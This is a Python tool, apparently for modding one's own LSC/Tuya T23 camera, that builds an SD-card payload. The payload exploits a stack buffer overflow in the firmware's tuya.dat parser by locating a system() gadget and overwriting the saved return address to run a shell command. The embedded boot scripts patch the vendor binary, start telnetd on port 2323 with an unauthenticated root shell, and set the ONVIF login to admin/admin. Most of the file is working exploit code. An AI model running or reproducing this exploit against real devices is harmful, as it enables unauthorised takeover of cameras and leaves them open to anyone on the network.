#!/usr/bin/env python3
import argparse
import shutil
import stat
import struct
from pathlib import Path


COMMAND_OFFSET_FROM_FIELD = 0x68
SAVED_RA_OFFSET_FROM_FIELD = 0x44
BOOTSTRAP_COMMAND = b"sh /tmp/mnt/sdcard/factory/firstboot.sh"


# Control-flow context immediately around the parser's existing
# `system(sp + 0x20)` call. Values which are expected to move between builds
# are masked. The usable return address is word 7.
SYSTEM_SP20_CONTEXT = (
    (0x3C060000, 0xFFFF0000),  # lui a2,...
    (0x3C040000, 0xFFFF0000),  # lui a0,...
    (0x27A70020, 0xFFFFFFFF),  # addiu a3,sp,0x20
    (0x24C60000, 0xFFFF0000),  # addiu a2,a2,...
    (0x2405010C, 0xFFFFFFFF),  # li a1,0x10c
    (0x0C000000, 0xFC000000),  # jal ...
    (0x24840000, 0xFFFF0000),  # addiu a0,a0,...
    (0x0C000000, 0xFC000000),  # jal system
    (0x27A40020, 0xFFFFFFFF),  # addiu a0,sp,0x20
    (0x27A40420, 0xFFFFFFFF),  # addiu a0,sp,0x420
    (0x24060044, 0xFFFFFFFF),  # li a2,0x44
    (0x0C000000, 0xFC000000),  # jal ...
    (0x00002825, 0xFFFFFFFF),  # move a1,zero
)
SYSTEM_SP20_WORD_INDEX = 7

# The vulnerable SD-card parser keeps its first unbounded fscanf destination at
# sp+0x120, saves ra at sp+0x164, and restores a 0x168-byte frame before
# returning. Therefore field+0x68 becomes caller-sp+0x20 at the gadget.
TUYA_PARSER_FRAME_SIZE = 0x168
TUYA_FIRST_FIELD_SP_OFFSET = 0x120
TUYA_SAVED_RA_SP_OFFSET = 0x164
TUYA_PARSER_PROLOGUE = tuple(
    (word, 0xFFFFFFFF)
    for word in (
        0x27BDFE98,  # addiu sp,sp,-0x168
        0x27A40060,  # addiu a0,sp,0x60
        0x24060040,  # li a2,0x40
        0x00002825,  # move a1,zero
        0xAFBF0164,  # sw ra,0x164(sp)
        0xAFB20154,
        0xAFB0014C,
        0xAFB50160,
        0xAFB4015C,
        0xAFB30158,
        0xAFB10150,
    )
)
TUYA_FIRST_FIELD_CLEAR = tuple(
    (word, 0xFFFFFFFF)
    for word in (
        0xAFA00120,
        0xAFA00124,
        0xAFA00128,
        0xAFA0012C,
        0xA3A00130,
    )
)


FIRSTBOOT = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOGDIR="$SD/logs"
LOG="$LOGDIR/firstboot.log"
PATCHER="$SD/custom/bin/patch_stone_main"
DST="$SD/factory/stone-main.bin"
TMP="$DST.tmp"
SOURCE_MD5="$DST.source.md5"
PATCH_MODE="$DST.mode"
STONE_LOW_POWER=__STONE_LOW_POWER__

mkdir -p "$LOGDIR" "$SD/factory" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null

log() {
    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
}

fail() {
    log "FAILED: $*"
    echo firstboot-failed > /dev/console
    exit 1
}

find_stone_exe() {
    for exe in /proc/[0-9]*/exe; do
        [ -r "$exe" ] || continue
        patch_stone --check "$exe" >/dev/null 2>&1 && {
            echo "$exe"
            return 0
        }
    done
    return 1
}

patch_stone() {
    if [ "$STONE_LOW_POWER" = "1" ]; then
        "$PATCHER" --keep-low-power "$@"
    else
        "$PATCHER" "$@"
    fi
}

echo firstboot-start > /dev/console
log "start"

if [ -f "$SD/tuya.dat" ]; then
    rm -f "$SD/tuya.dat" 2>> "$LOG" || fail "could not consume tuya.dat trigger"
    sync
    log "consumed tuya.dat trigger"
fi

[ -x "$PATCHER" ] || fail "missing patcher: $PATCHER"
log "stone low power=$STONE_LOW_POWER"

src="$(find_stone_exe)" || fail "could not find running Tuya executable via /proc"
log "copying Tuya executable from $src"
rm -f "$TMP"
cp "$src" "$TMP" 2>> "$LOG" || fail "copy failed from $src"
patch_stone "$TMP" >> "$LOG" 2>&1 || fail "patch failed"
chmod 755 "$TMP" 2>> "$LOG" || true
mv -f "$TMP" "$DST" 2>> "$LOG" || fail "move failed"
source_md5="$(md5sum "$src" 2>> "$LOG")"
source_md5="${source_md5%% *}"
if [ -n "$source_md5" ]; then
    printf "%s\n" "$source_md5" > "$SOURCE_MD5" 2>> "$LOG" || true
    log "recorded stock executable md5=$source_md5"
fi
printf "%s\n" "$STONE_LOW_POWER" > "$PATCH_MODE" 2>> "$LOG" || true
sync
log "wrote patched $DST"

touch /config/fmode 2>> "$LOG" || fail "could not set /config/fmode"
sync
log "set /config/fmode; rebooting into factory bootstrap"
echo firstboot-reboot > /dev/console
reboot
"""


T23_ENTRYPOINT = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOGDIR="$SD/logs"
LOG="$LOGDIR/t23-entrypoint.log"
PATCHER="$SD/custom/bin/patch_stone_main"
STONE_LOW_POWER=__STONE_LOW_POWER__

mkdir -p "$LOGDIR" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null

log() {
    echo "[$(date +%Y-%m-%dT%H:%M:%S)] $*" >> "$LOG"
}

STONE_MAIN="$SD/factory/stone-main.bin"
STONE_MAIN_TMP="$STONE_MAIN.tmp"
STONE_SOURCE_MD5="$STONE_MAIN.source.md5"
STONE_PATCH_MODE="$STONE_MAIN.mode"
STOCK_STONE_MAIN=/stone/main
EARLY_STOCK_STONE_MAIN=/stone/.lsc-stock-main
STONE_RUN="$STONE_MAIN"
TELNET_PORT=2323
ONVIF_PORT=8899
TUYA_HUM_ON_OFF=0
TUYA_PIR_ON_OFF=1
TUYA_PIR_SENS=1
TUYA_RECORD_TIME=2
TUYA_FLIP_ONOFF=0
TUYA_WATERMARK_ONOFF=0
AIC_FILTER_SECONDS=90
LOW_POWER_MOTION_HOLD_SECONDS=30
LOW_POWER_MOTION_REPULSE_SECONDS=10
LOG_MAX_BYTES=262144
LOG_PRUNE_INTERVAL_SECONDS=60

echo t23-entrypoint-start > /dev/console
log "start"
log "stone low power=$STONE_LOW_POWER"
for run_log in stone-main.log telnetd.log aic_filter.log stream_relay.log onvif_httpd.log wsd_simple_server.log onvif_simple_server.log onvif_notify_server.log video_motion.log pir_motion.log; do
    : > "$LOGDIR/$run_log" 2>/dev/null || true
done
log "reset per-run logs"

prune_runtime_logs() {
    for run_log in "$LOGDIR"/*.log "$SD/factory/main.log"; do
        [ -f "$run_log" ] || continue
        size="$(stat -c %s "$run_log" 2>/dev/null || echo 0)"
        case "$size" in
            ""|*[!0-9]*) size=0 ;;
        esac
        if [ "$size" -gt "$LOG_MAX_BYTES" ]; then
            : > "$run_log" 2>/dev/null || continue
            log "pruned ${run_log##*/} at $size bytes"
        fi
    done
}

start_log_pruner() {
    (
        while true; do
            sleep "$LOG_PRUNE_INTERVAL_SECONDS"
            prune_runtime_logs
        done
    ) &
    log "started log pruner pid=$! max=$LOG_MAX_BYTES interval=$LOG_PRUNE_INTERVAL_SECONDS"
}

prune_runtime_logs

touch /config/fmode 2>> "$LOG" || true
sync
log "asserted /config/fmode"

start_telnetd() {
    mkdir -p /dev/pts 2>> "$LOGDIR/telnetd.log" || true
    mount | grep 'on /dev/pts ' >/dev/null 2>&1 || mount -t devpts devpts /dev/pts 2>> "$LOGDIR/telnetd.log" || true
    log "starting telnetd port=$TELNET_PORT"
    echo "telnetd-start-$TELNET_PORT" > /dev/console
    /sbin/telnetd -p "$TELNET_PORT" -l /bin/sh >> "$LOGDIR/telnetd.log" 2>&1 &
    log "started telnetd pid=$!"
}

start_aic_forward() {
    (
        helper="$SD/custom/bin/aic_filter"
        if [ ! -x "$helper" ]; then
            log "missing AIC filter helper: $helper"
            exit 0
        fi

        i=0
        while [ "$i" -lt "$AIC_FILTER_SECONDS" ]; do
            {
                echo "===== aic-filter round $i $(date +%Y-%m-%dT%H:%M:%S) ====="
                "$helper"
            } >> "$LOGDIR/aic_filter.log" 2>&1 || true
            i=$((i + 1))
            sleep 1
        done
        log "finished AIC TCP forward setup"
    ) &
    log "started AIC TCP forward pid=$!"
}

start_stream_relay() {
    helper="$SD/custom/bin/stone_dump_relay"
    if [ ! -x "$helper" ]; then
        log "missing stream relay helper: $helper"
        return
    fi

    if [ "$STONE_LOW_POWER" = "1" ]; then
        motion_bytes=0
    else
        motion_bytes=1
    fi

    log "starting stream relay byte_motion=$motion_bytes"
    echo stream-relay-start > /dev/console
    STONE_MOTION_BYTES="$motion_bytes" "$helper" >> "$LOGDIR/stream_relay.log" 2>&1 &
    log "started stream relay pid=$!"
}

start_onvif() {
    httpd="$SD/custom/bin/onvif_cgi_httpd"
    wsd="$SD/custom/bin/wsd_simple_server"
    notify="$SD/custom/bin/onvif_notify_server"
    onvif_root="$SD/custom/onvif"
    notify_dir="/tmp/onvif_notify_server"

    if [ ! -x "$httpd" ]; then
        log "missing ONVIF HTTP helper: $httpd"
        return
    fi
    if [ ! -x "$SD/custom/bin/onvif_simple_server" ]; then
        log "missing ONVIF CGI helper: $SD/custom/bin/onvif_simple_server"
        return
    fi
    if [ ! -f "$onvif_root/onvif_simple_server.conf" ]; then
        log "missing ONVIF config: $onvif_root/onvif_simple_server.conf"
        return
    fi

    mkdir -p "$notify_dir" 2>> "$LOGDIR/onvif_notify_server.log" || true
    rm -f "$notify_dir/motion_alarm" 2>> "$LOGDIR/onvif_notify_server.log" || true
    if [ -x "$notify" ] && [ -d "$onvif_root/notify_files" ]; then
        log "starting ONVIF notify server"
        "$notify" -c "$onvif_root/onvif_simple_server.conf" \
            -t "$onvif_root/notify_files" -p /tmp/onvif_notify_server.pid -f \
            >> "$LOGDIR/onvif_notify_server.log" 2>&1 &
        log "started ONVIF notify server pid=$!"
    else
        log "missing ONVIF notify helper or templates"
    fi

    log "starting ONVIF HTTP port=$ONVIF_PORT"
    echo onvif-http-start > /dev/console
    "$httpd" >> "$LOGDIR/onvif_httpd.log" 2>&1 &
    log "started ONVIF HTTP pid=$!"

    if [ -x "$wsd" ] && [ -d "$onvif_root/wsd_files" ]; then
        (
            i=0
            while [ "$i" -lt 45 ]; do
                if ps | grep wsd_simple_server | grep -v grep >/dev/null 2>&1; then
                    log "ONVIF WS-Discovery already running"
                    exit 0
                fi

                log "starting ONVIF WS-Discovery attempt=$i"
                "$wsd" -i wlan0 -x "http://%s:$ONVIF_PORT/onvif/device_service" \
                    -m "LSC%20Outdoor%20Camera" -n "LSC" \
                    -p /tmp/wsd_simple_server.pid -t "$onvif_root/wsd_files" -f \
                    >> "$LOGDIR/wsd_simple_server.log" 2>&1 &
                pid=$!
                sleep 3
                if kill -0 "$pid" 2>/dev/null; then
                    log "started ONVIF WS-Discovery pid=$pid attempt=$i"
                    exit 0
                fi

                log "ONVIF WS-Discovery exited attempt=$i"
                i=$((i + 1))
                sleep 2
            done
            log "ONVIF WS-Discovery failed after retries"
        ) &
        log "started ONVIF WS-Discovery retry pid=$!"
    else
        log "missing ONVIF WS-Discovery helper or templates"
    fi
}

set_tuya_config() {
    key="$1"
    value="$2"
    path="/config/tuya/$key"
    current="$(cat "$path" 2>/dev/null || true)"
    if [ "$current" = "$value" ]; then
        return
    fi
    printf "%s\\n" "$value" > "$path" 2>> "$LOG" && log "set $key=$value"
}

patch_stone() {
    if [ "$STONE_LOW_POWER" = "1" ]; then
        "$PATCHER" --keep-low-power "$@"
    else
        "$PATCHER" "$@"
    fi
}

prepare_stone_main() {
    stock_source="$STOCK_STONE_MAIN"
    if [ ! -x "$stock_source" ] && [ -x "$EARLY_STOCK_STONE_MAIN" ]; then
        stock_source="$EARLY_STOCK_STONE_MAIN"
        log "using early-linked stock Tuya executable at $stock_source"
    fi

    if [ ! -x "$stock_source" ]; then
        STONE_RUN="$STONE_MAIN"
        log "stock Tuya executable not found; using SD copy"
        [ -x "$STONE_MAIN" ]
        return
    fi

    # Prefer the current stock binary until a compatible SD copy has been
    # positively selected. A failed refresh must never launch a stale copy.
    STONE_RUN="$stock_source"
    stock_md5="$(md5sum "$stock_source" 2>> "$LOG")"
    stock_md5="${stock_md5%% *}"
    saved_md5="$(cat "$STONE_SOURCE_MD5" 2>/dev/null || true)"
    saved_mode="$(cat "$STONE_PATCH_MODE" 2>/dev/null || true)"
    if [ -n "$stock_md5" ] && [ "$stock_md5" = "$saved_md5" ] &&
       [ "$saved_mode" = "$STONE_LOW_POWER" ] && [ -x "$STONE_MAIN" ]; then
        if patch_stone "$STONE_MAIN" >> "$LOG" 2>&1; then
            STONE_RUN="$STONE_MAIN"
            log "reusing patched Tuya executable for stock md5=$stock_md5"
            return 0
        fi
        log "saved Tuya executable failed validation; rebuilding from stock"
    elif [ -n "$stock_md5" ]; then
        log "refreshing Tuya executable stock=$saved_md5/$stock_md5 mode=$saved_mode/$STONE_LOW_POWER"
    else
        log "could not calculate stock Tuya executable md5; validating a fresh copy"
    fi

    rm -f "$STONE_MAIN_TMP"
    if cp "$stock_source" "$STONE_MAIN_TMP" 2>> "$LOG" &&
       patch_stone "$STONE_MAIN_TMP" >> "$LOG" 2>&1; then
        chmod 755 "$STONE_MAIN_TMP" 2>> "$LOG" || true
        if mv -f "$STONE_MAIN_TMP" "$STONE_MAIN" 2>> "$LOG"; then
            if [ -n "$stock_md5" ]; then
                printf "%s\n" "$stock_md5" > "$STONE_SOURCE_MD5" 2>> "$LOG" || true
            fi
            printf "%s\n" "$STONE_LOW_POWER" > "$STONE_PATCH_MODE" 2>> "$LOG" || true
            sync
            STONE_RUN="$STONE_MAIN"
            log "installed patched Tuya executable from current stock firmware"
            return 0
        fi
        log "could not install patched Tuya executable; keeping current stock executable"
    fi

    rm -f "$STONE_MAIN_TMP"
    log "using current stock Tuya executable unmodified"
    log "local shell and RTSP relay still launch; stream and ONVIF snapshot availability may vary"
    return 0
}

configure_tuya_motion() {
    mkdir -p /config/tuya 2>> "$LOG" || true
    set_tuya_config tuya_hum_on_off "$TUYA_HUM_ON_OFF"
    set_tuya_config tuya_pir_on_off "$TUYA_PIR_ON_OFF"
    set_tuya_config tuya_pir_sens "$TUYA_PIR_SENS"
    set_tuya_config tuya_record_time "$TUYA_RECORD_TIME"
    set_tuya_config tuya_flip_onoff "$TUYA_FLIP_ONOFF"
    set_tuya_config tuya_watermark_onoff "$TUYA_WATERMARK_ONOFF"
    sync
}

start_pir_motion_watcher() {
    if [ "$STONE_LOW_POWER" != "1" ]; then
        log "PIR log motion watcher disabled"
        return
    fi

    (
        notify_dir="/tmp/onvif_notify_server"
        motion_file="$notify_dir/motion_alarm"
        src="$LOGDIR/stone-main.log"
        out="$LOGDIR/pir_motion.log"
        seen=0
        motion_until=0
        repulse_at=0

        mkdir -p "$notify_dir" >/dev/null 2>&1 || true
        echo "[$(date +%Y-%m-%dT%H:%M:%S)] watcher start hold=$LOW_POWER_MOTION_HOLD_SECONDS" >> "$out"
        while true; do
            now="$(date +%s 2>/dev/null || echo 0)"
            if [ "$motion_until" -gt 0 ] && [ "$now" -ge "$motion_until" ]; then
                rm -f "$motion_file" 2>/dev/null || true
                motion_until=0
                repulse_at=0
                echo "[$(date +%Y-%m-%dT%H:%M:%S)] motion-off" >> "$out"
            fi
            if [ "$repulse_at" -gt 0 ] && [ "$now" -ge "$repulse_at" ] && [ "$motion_until" -gt "$now" ] && [ -f "$motion_file" ]; then
                rm -f "$motion_file" 2>/dev/null || true
                sleep 1
                : > "$motion_file" 2>/dev/null || true
                repulse_at=$((now + LOW_POWER_MOTION_REPULSE_SECONDS))
                echo "[$(date +%Y-%m-%dT%H:%M:%S)] motion-repulse" >> "$out"
            fi

            if [ -f "$src" ]; then
                n=0
                while IFS= read -r line; do
                    n=$((n + 1))
                    [ "$n" -le "$seen" ] && continue
                    case "$line" in
                        *">pir evt<"*|*"pir:1("*)
                            ;;
                        *"event="*)
                            event="${line#*event=}"
                            event="${event%%[!0-9]*}"
                            [ -n "$event" ] && [ "$((event & 2))" -ne 0 ] || continue
                            ;;
                        *)
                            continue
                            ;;
                    esac

                    now="$(date +%s 2>/dev/null || echo 0)"
                    if [ "$motion_until" -le "$now" ] || [ ! -f "$motion_file" ]; then
                        : > "$motion_file" 2>/dev/null || true
                        repulse_at=$((now + LOW_POWER_MOTION_REPULSE_SECONDS))
                        echo "[$(date +%Y-%m-%dT%H:%M:%S)] motion-on $line" >> "$out"
                    fi
                    motion_until=$((now + LOW_POWER_MOTION_HOLD_SECONDS))
                done < "$src"
                if [ "$n" -lt "$seen" ]; then
                    seen=0
                else
                    seen="$n"
                fi
            fi
            sleep 1
        done
    ) &
    log "started PIR log motion watcher pid=$!"
}

start_stone_main() {
    if [ ! -x "$PATCHER" ]; then
        log "missing patcher: $PATCHER"
    fi
    prepare_stone_main || log "could not prepare current stock Tuya executable"

    if [ -x "$STONE_RUN" ]; then
        "$STONE_RUN" >> "$LOGDIR/stone-main.log" 2>&1 &
        log "started Tuya stone main path=$STONE_RUN pid=$!"
    else
        log "missing executable STONE_RUN=$STONE_RUN"
        echo missing-stone-main > /dev/console
    fi
}

configure_tuya_motion
start_telnetd
start_stone_main
sleep 2
start_stream_relay
start_onvif
start_pir_motion_watcher
start_aic_forward
start_log_pruner

wait
"""


FACTORY_MAIN = """#!/bin/sh
SD=/tmp/mnt/sdcard
LOG="$SD/factory/main.log"
ENTRYPOINT="$SD/custom/scripts/entrypoint_t23.sh"
EARLY_STOCK=/stone/.lsc-stock-main

# rcS starts this hook in the background and then unlinks /stone/main.  Take
# an immediate hard link before doing any SD-card I/O so the entrypoint can
# validate and patch the firmware that actually booted after an OTA.
if [ -x /stone/main ]; then
    if ln /stone/main "$EARLY_STOCK" 2>/dev/null; then
        EARLY_STOCK_STATUS=linked
    elif cp /stone/main "$EARLY_STOCK" 2>/dev/null; then
        chmod +x "$EARLY_STOCK" 2>/dev/null || true
        EARLY_STOCK_STATUS=copied
    else
        EARLY_STOCK_STATUS=failed
    fi
else
    EARLY_STOCK_STATUS=missing
fi

mkdir -p "$SD/factory" "$SD/logs" "$SD/custom/scripts" >/dev/null 2>&1 || true
: > "$LOG" 2>/dev/null || LOG=/dev/null
echo factory-main-bootstrap > /dev/console
echo factory-main-bootstrap >> "$LOG"
echo "early-stock-$EARLY_STOCK_STATUS" >> "$LOG"

if [ -f "$ENTRYPOINT" ]; then
    chmod +x "$ENTRYPOINT" 2>/dev/null || true
    exec /bin/sh "$ENTRYPOINT"
fi

echo "missing $ENTRYPOINT" >> "$LOG"
echo missing-entrypoint-t23 > /dev/console
while true; do
    sleep 3600
done
"""


ONVIF_CONFIG = """model=LSC Outdoor Camera
manufacturer=LSC
firmware_ver=LSC-T23-stock-plus-local
hardware_id=Ingenic T23
serial_num=LSC-T23
ifs=wlan0
port=8899
scope=onvif://www.onvif.org/Profile/Streaming
scope=onvif://www.onvif.org/Profile/T
scope=onvif://www.onvif.org/hardware/LSC-T23
scope=onvif://www.onvif.org/name/LSC%20Outdoor%20Camera
user=admin
password=admin
adv_enable_media2=0
adv_fault_if_unknown=0
adv_fault_if_set=0
adv_synology_nvr=0
name=Profile_0
width=1920
height=1080
url=rtsp://%s:8554/main_ch
snapurl=http://%s:8899/snapshot.jpg
type=H264
audio_encoder=NONE
audio_decoder=NONE
ptz=0
events=3
topic=tns1:VideoSource/MotionAlarm
source_name=Source
source_type=tt:ReferenceToken
source_value=VideoSourceToken
input_file=/tmp/onvif_notify_server/motion_alarm
"""


def elf32_load_segments(data: bytes) -> list[tuple[int, int, int]]:
    if len(data) < 52 or data[:4] != b"\x7fELF":
        raise ValueError("stone-main is not an ELF file")
    if data[4] != 1 or data[5] != 1:
        raise ValueError("stone-main must be a 32-bit little-endian ELF")

    (
        _e_type,
        e_machine,
        _e_version,
        _e_entry,
        e_phoff,
        _e_shoff,
        _e_flags,
        _e_ehsize,
        e_phentsize,
        e_phnum,
        _e_shentsize,
        _e_shnum,
        _e_shstrndx,
    ) = struct.unpack_from("<HHIIIIIHHHHHH", data, 16)
    if e_machine != 8:
        raise ValueError("stone-main is not a MIPS ELF")
    if e_phentsize < 32 or e_phoff > len(data):
        raise ValueError("stone-main has an invalid program-header table")
    if e_phnum > (len(data) - e_phoff) // e_phentsize:
        raise ValueError("stone-main has a truncated program-header table")

    segments: list[tuple[int, int, int]] = []
    for index in range(e_phnum):
        offset = e_phoff + index * e_phentsize
        p_type, p_offset, p_vaddr, _p_paddr, p_filesz, *_rest = struct.unpack_from(
            "<IIIIIIII", data, offset
        )
        if p_type == 1:
            segments.append((p_offset, p_vaddr, p_filesz))
    return segments


def file_offset_to_vaddr(segments: list[tuple[int, int, int]], file_offset: int) -> int:
    for segment_offset, segment_vaddr, segment_size in segments:
        if segment_offset <= file_offset < segment_offset + segment_size:
            return segment_vaddr + file_offset - segment_offset
    raise ValueError(f"file offset 0x{file_offset:x} is not in an ELF load segment")


def find_word_contexts(data: bytes, context: tuple[tuple[int, int], ...]) -> list[int]:
    context_size = len(context) * 4
    matches: list[int] = []

    for offset in range(0, len(data) - context_size + 1, 4):
        for index, (value, mask) in enumerate(context):
            word = struct.unpack_from("<I", data, offset + index * 4)[0]
            if word & mask != value & mask:
                break
        else:
            matches.append(offset)
    return matches


def validate_tuya_overflow_layout(data: bytes, stone_main: Path) -> None:
    parser_matches = find_word_contexts(data, TUYA_PARSER_PROLOGUE)
    field_matches = find_word_contexts(data, TUYA_FIRST_FIELD_CLEAR)
    if len(parser_matches) != 1:
        raise ValueError(
            f"expected one vulnerable tuya.dat parser prologue in {stone_main}, "
            f"found {len(parser_matches)}"
        )

    parser_offset = parser_matches[0]
    nearby_fields = [
        offset for offset in field_matches if parser_offset <= offset < parser_offset + 0x300
    ]
    if len(nearby_fields) != 1:
        raise ValueError(
            f"could not verify the tuya.dat first-field stack slot in {stone_main}"
        )
    if b"%[^,],%[^,],%[^,],%[^,],\0" not in data:
        raise ValueError(f"unbounded tuya.dat fscanf format not found in {stone_main}")

    saved_ra_offset = TUYA_SAVED_RA_SP_OFFSET - TUYA_FIRST_FIELD_SP_OFFSET
    command_offset = (
        TUYA_PARSER_FRAME_SIZE + 0x20 - TUYA_FIRST_FIELD_SP_OFFSET
    )
    if saved_ra_offset != SAVED_RA_OFFSET_FROM_FIELD:
        raise ValueError(
            f"tuya.dat saved-ra offset changed to 0x{saved_ra_offset:x} in {stone_main}"
        )
    if command_offset != COMMAND_OFFSET_FROM_FIELD:
        raise ValueError(
            f"tuya.dat command offset changed to 0x{command_offset:x} in {stone_main}"
        )


def discover_system_sp20_gadget(stone_main: Path) -> int:
    data = stone_main.read_bytes()
    segments = elf32_load_segments(data)
    validate_tuya_overflow_layout(data, stone_main)
    matches = find_word_contexts(data, SYSTEM_SP20_CONTEXT)

    if len(matches) != 1:
        raise ValueError(
            f"expected one system(sp+0x20) gadget context in {stone_main}, "
            f"found {len(matches)}"
        )

    gadget_offset = matches[0] + SYSTEM_SP20_WORD_INDEX * 4
    gadget_vaddr = file_offset_to_vaddr(segments, gadget_offset)
    if gadget_vaddr > 0xFFFFFFFF:
        raise ValueError(f"gadget address 0x{gadget_vaddr:x} does not fit in 32 bits")
    return gadget_vaddr


def build_tuya_dat(command: bytes, saved_ra: int) -> bytes:
    if b"," in command:
        raise ValueError("command must not contain comma bytes")
    field = bytearray(b"A" * COMMAND_OFFSET_FROM_FIELD)
    struct.pack_into("<I", field, SAVED_RA_OFFSET_FROM_FIELD, saved_ra)
    field.extend(command + b"\0")
    return bytes(field) + b",B,C,D,\n"


def chmod_exec(path: Path) -> None:
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def copy_aic_filter(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "aic_filter"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "aic_filter"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_stream_relay(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "stone_dump_relay"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "stone_dump_relay"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_patch_helper(mount: Path) -> None:
    src = Path(__file__).resolve().parents[1] / "build" / "mipsel" / "bin" / "patch_stone_main"
    if not src.is_file():
        raise SystemExit(f"missing {src}; run ./tools/compile.sh first")

    dst = mount / "custom" / "bin" / "patch_stone_main"
    dst.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(src, dst)
    chmod_exec(dst)


def copy_onvif_files(mount: Path) -> None:
    root = Path(__file__).resolve().parents[1]
    bin_dir = root / "build" / "mipsel" / "bin"
    onvif_src = root / "build" / "third_party" / "onvif_simple_server"
    bin_names = ("onvif_cgi_httpd", "onvif_simple_server", "onvif_notify_server", "wsd_simple_server")
    asset_dirs = (
        "device_service_files",
        "deviceio_service_files",
        "events_service_files",
        "generic_files",
        "media2_service_files",
        "media_service_files",
        "notify_files",
        "ptz_service_files",
        "wsd_files",
    )

    for name in bin_names:
        src = bin_dir / name
        if not src.is_file():
            raise SystemExit(f"missing {src}; run ./tools/compile.sh first")
        dst = mount / "custom" / "bin" / name
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dst)
        chmod_exec(dst)

    if not onvif_src.is_dir():
        raise SystemExit(f"missing {onvif_src}; run ./tools/compile.sh first")

    dst_root = mount / "custom" / "onvif"
    dst_root.mkdir(parents=True, exist_ok=True)
    (dst_root / "onvif_simple_server.conf").write_text(ONVIF_CONFIG, encoding="ascii")

    for name in asset_dirs:
        src = onvif_src / name
        if not src.is_dir():
            raise SystemExit(f"missing ONVIF asset directory {src}")
        shutil.copytree(src, dst_root / name, dirs_exist_ok=True)

    for xml in (dst_root / "device_service_files").glob("*.xml"):
        data = xml.read_text(encoding="ascii")
        data = data.replace('UsernameToken="false"', 'UsernameToken="true"')
        data = data.replace("MaxUsers=\"0\"", "MaxUsers=\"1\"")
        data = data.replace("MaxUserNameLength=\"0\"", "MaxUserNameLength=\"32\"")
        data = data.replace("MaxPasswordLength=\"0\"", "MaxPasswordLength=\"64\"")
        xml.write_text(data, encoding="ascii")

    notify_xml = dst_root / "notify_files" / "Notify.xml"
    data = notify_xml.read_text(encoding="ascii")
    if 'xmlns:tns1="http://www.onvif.org/ver10/topics"' not in data:
        data = data.replace(
            'xmlns:tt="http://www.onvif.org/ver10/schema">',
            'xmlns:tt="http://www.onvif.org/ver10/schema"\n'
            '                   xmlns:tns1="http://www.onvif.org/ver10/topics">',
        )
        notify_xml.write_text(data, encoding="ascii")


def script_with_options(script: str, *, stone_low_power: bool) -> str:
    return script.replace("__STONE_LOW_POWER__", "1" if stone_low_power else "0")


def write_mount(mount: Path, payload: bytes | None, *, stone_low_power: bool) -> None:
    if not mount.is_dir():
        raise SystemExit(f"mountpoint is not a directory: {mount}")

    (mount / "factory").mkdir(parents=True, exist_ok=True)
    (mount / "custom" / "scripts").mkdir(parents=True, exist_ok=True)
    (mount / "logs").mkdir(parents=True, exist_ok=True)

    trigger = mount / "tuya.dat"
    (mount / "tuya.dat.used").unlink(missing_ok=True)
    if payload is None:
        trigger.unlink(missing_ok=True)
    else:
        trigger.write_bytes(payload)

    factory_main = mount / "factory" / "main"
    factory_main.write_text(FACTORY_MAIN, encoding="ascii")
    chmod_exec(factory_main)

    firstboot = mount / "factory" / "firstboot.sh"
    firstboot.write_text(script_with_options(FIRSTBOOT, stone_low_power=stone_low_power), encoding="ascii")
    chmod_exec(firstboot)

    entrypoint = mount / "custom" / "scripts" / "entrypoint_t23.sh"
    entrypoint.write_text(script_with_options(T23_ENTRYPOINT, stone_low_power=stone_low_power), encoding="ascii")
    chmod_exec(entrypoint)

    copy_aic_filter(mount)
    copy_stream_relay(mount)
    copy_patch_helper(mount)
    copy_onvif_files(mount)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Write a T23/AIC SD bootstrap payload with an explicit trigger policy."
    )
    parser.set_defaults(stone_low_power=True)
    power = parser.add_mutually_exclusive_group()
    power.add_argument("--stone-low-power", dest="stone_low_power", action="store_true",
                       help="keep stone-main's stock low-power branch enabled (default)")
    power.add_argument("--no-low-power", dest="stone_low_power", action="store_false",
                       help="patch stone-main to keep Linux awake and use RTSP byte-motion fallback")
    trigger = parser.add_mutually_exclusive_group(required=True)
    trigger.add_argument(
        "--stone-main",
        type=Path,
        help=(
            "exact extracted stock stone/main from the firmware currently "
            "installed on the target camera"
        ),
    )
    trigger.add_argument(
        "--no-trigger",
        action="store_true",
        help="build an update-only payload and ensure tuya.dat is absent",
    )
    parser.add_argument("mountpoint", nargs="?", help="SD card mountpoint to write")
    args = parser.parse_args()

    if args.stone_main is not None:
        try:
            saved_ra = discover_system_sp20_gadget(args.stone_main)
        except (OSError, ValueError) as exc:
            parser.error(str(exc))
    else:
        saved_ra = None

    payload = None if saved_ra is None else build_tuya_dat(BOOTSTRAP_COMMAND, saved_ra)

    if not args.mountpoint:
        parser.error("provide a mountpoint")

    mount = Path(args.mountpoint)
    write_mount(mount, payload, stone_low_power=args.stone_low_power)

    if payload is None:
        print(f"no trigger: ensured {mount / 'tuya.dat'} is absent")
    else:
        print(f"wrote {mount / 'tuya.dat'} ({len(payload)} bytes)")
    print(f"wrote {mount / 'factory' / 'main'}")
    print(f"wrote {mount / 'factory' / 'firstboot.sh'}")
    print(f"wrote {mount / 'custom' / 'scripts' / 'entrypoint_t23.sh'}")
    print(f"stone low power: {'enabled' if args.stone_low_power else 'disabled'}")
    print("telnet: telnet <camera-ip> 2323")
    print("RTSP main stream: rtsp://<camera-ip>:8554/main_ch")
    print("ONVIF device service: http://<camera-ip>:8899/onvif/device_service")
